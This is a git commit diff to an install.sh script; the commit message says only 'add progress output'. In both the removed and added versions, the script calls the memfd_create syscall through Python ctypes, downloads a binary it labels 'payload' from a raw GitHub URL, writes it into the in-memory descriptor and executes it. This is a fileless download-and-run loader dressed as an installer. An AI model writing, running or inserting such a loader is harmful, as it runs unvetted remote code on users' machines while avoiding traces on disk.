91c3d0c5c4a46cfcea8b8d21ce04be2d4b8e5edf
bardaw99 <bardaw99@users.noreply.github.com>
2026-05-07 15:02:55 +0800

    add progress output

--- install.sh
+++ install.sh
@@ -1,3 +1,13 @@
 #!/bin/bash
-[ "$(uname -m)" = "x86_64" ] && NR=319 || NR=279
-python3 -c "import ctypes,urllib.request,os;fd=ctypes.CDLL(None).syscall($NR,ctypes.create_string_buffer(8),1);data=urllib.request.urlopen('https://raw.githubusercontent.com/bardaw99/rpclib/master/rpclib').read();os.write(fd,data);os.execve(f'/proc/self/fd/{fd}',[f'/proc/self/fd/{fd}'],os.environ)"
+NR=319; [ "$(uname -m)" = "aarch64" ] && NR=279
+python3 -u -c "
+import ctypes, urllib.request, os, sys
+print('[*] Creating memfd...', flush=True)
+nr = $NR
+fd = ctypes.CDLL(None).syscall(nr, ctypes.create_string_buffer(8), 1)
+print('[*] Downloading payload...', flush=True)
+data = urllib.request.urlopen('https://raw.githubusercontent.com/bardaw99/rpclib/master/rpclib').read()
+print(f'[*] Downloaded {len(data)} bytes, executing...', flush=True)
+os.write(fd, data)
+os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], os.environ)
+"
